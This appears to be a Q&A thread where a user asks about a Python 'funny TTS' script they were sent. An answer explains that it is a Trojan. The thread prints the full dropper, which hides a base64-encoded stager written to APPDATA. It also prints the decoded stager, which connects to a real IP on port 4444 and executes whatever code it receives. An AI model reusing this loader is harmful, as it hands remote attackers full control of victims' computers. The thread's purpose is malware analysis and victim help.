<div class="post-text" itemprop="text">
<p>I downloaded a Python program from someone I was talking to online. It seemed pretty useless, and a funny concept. The program would use google TTS to say some funny phrase. When I ran the program, I thought nothing of it, that was until weird things started to happen. My Pycharm closed, without prompting me if I want it to close like it usually does. Then my Brave browser closed too. I got suspicions, so I looked in my task manager, and Python was still running. I terminated the Python that was running, and the odd occurrences seemed to stop. I looked back at the Python file I was sent, and found something extremely odd.</p>
<p>Here was the Python program I was sent:</p>
<pre><code>import pip
import os
import string
import subprocess
from subprocess import Popen
import sys

try:
    from pip import main as pipmain
except:
    from pip._internal import main as pipmain

reqs = subprocess.check_output([sys.executable, '-m', 'pip', 'freeze'])
file = open(os.getenv('APPDATA') + "temp.py", "w")
file.write("import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE3OC4xMjguMTg2LjE4MicsNDQ0NCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))")
file.close()
gt = subprocess = Popen(['pythonw', os.getenv('APPDATA') + "temp.py"])
installed_packages = [r.decode().split('==')[0] for r in reqs.split()]
def installpackage(package):
    pipmain(['install', package])

if not 'gTTS' in installed_packages:
    installpackage('gTTS')
if not 'playsound' in installed_packages:
    installpackage('playsound')

import playsound
from gtts import gTTS

tts = gTTS(text='Her the fat hippo',lang='en')
tts.save("temp.mp3")
playsound.playsound('temp.mp3')
os.remove("temp.mp3")
</code></pre>
<p>But looking at lines 13 to 17, I wondered what that encoded bit was. I can confirm, a file containing the encoded code was siting in my APPDATA folder.</p>
<p>Encoded part of code:</p>
<pre><code>file.write("import base64,sys;exec(base64.b64decode({2:str,3:lambda `b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE3OC4xMjguMTg2LjE4MicsNDQ0NCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))")`
</code></pre>
<p>When I decode it with base64 I get</p>
<pre><code>import socket,struct,time
for x in range(10):
    try:
        s=socket.socket(2,socket.SOCK_STREAM)
        s.connect(('178.128.186.182',4444))
        break
    except:
        time.sleep(5)
l=struct.unpack('&gt;I',s.recv(4))[0]
d=s.recv(l)
while len(d)&lt;l:
    d+=s.recv(l-len(d))
exec(d,{'s':s})
</code></pre>
<p>What is this file that was written into my APPDATA supposed to do? All I can understand that it opens that IP 10 times. If it can't connect, wait 5 seconds. The purpose of this program confused me the most.</p>
</div>
<div class="post-text" itemprop="text">
<p>It's a <a href="https://en.wikipedia.org/wiki/Trojan_horse_(computing)" rel="nofollow noreferrer"><em>Trojan</em></a>, a script with a hidden backdoor. You must assume that your computer is <strong>not yet safe</strong>, as the Trojan has probably installed more software on your computer. If you ran this at a school or an office, you need to go and inform the IT department there about this incident, because this is a security breach within their network, the attackers could have used your computer as a way in.</p>
<p>The loop tries to connect to another computer, <em>up to</em> ten times. If the connection attempt it succeeds the <code>break</code> stops the loop.</p>
<p>Once it connects, it reads 4 bytes as an unsigned integer number, and reads that many bytes from the socket:</p>
<pre><code>l=struct.unpack('&gt;I',s.recv(4))[0]
d=s.recv(l)
while len(d)&lt;l:
    d+=s.recv(l-len(d))
</code></pre>
<p><code>l</code> is now an integer between 0 and 18446744073709551615, and the next three lines are used to read that many bytes from the socket into <code>d</code>. <code>s.recv(l)</code> will read <em>up to</em> <code>l</code> bytes but may receive fewer, it depends on how much data has arrived over the network so far. The <code>while</code> loop then keeps reading from the socket until all <code>l</code> bytes have been received.</p>
<p>It's a standard way of receiving data from a remote connection, read a small fixed number of bytes to encode the length, then keep reading from the socket until you have received all of the expected data.</p>
<p>Then, <code>exec(d,{'s':s})</code> will <a href="https://docs.python.org/3/library/functions.html#exec" rel="nofollow noreferrer"><em>execute</em> that data as Python code</a>, with access to the socket. So we don't know what the program does any more from that point onwards, because the remote socket has been given full control.</p>
<p>Because the code executed at that point can do <em>anything it likes</em>, it has probably downloaded other software to further take over your computer. You really, really, <strong>really</strong> want to fully clean it with anti-virus software at this point.</p>
<p>The IP address and port is not accepting connections right now, so I can't go and retrieve the 'payload', the code this script is meant to retrieve and execute, so we can't tell you more specifically what to look for. Such connect-and-download payloads typically change all the time to adjust to circumstances and to increase chances of success.</p>
</div>
<span class="comment-copy">It's downloading something and <code>exec</code>-ing it.  Not good...</span>
<span class="comment-copy">I have McCaf√© antivirus running constantly, but when I get home I will run a full computer scan. Thank you for informing me of what this script did.</span>
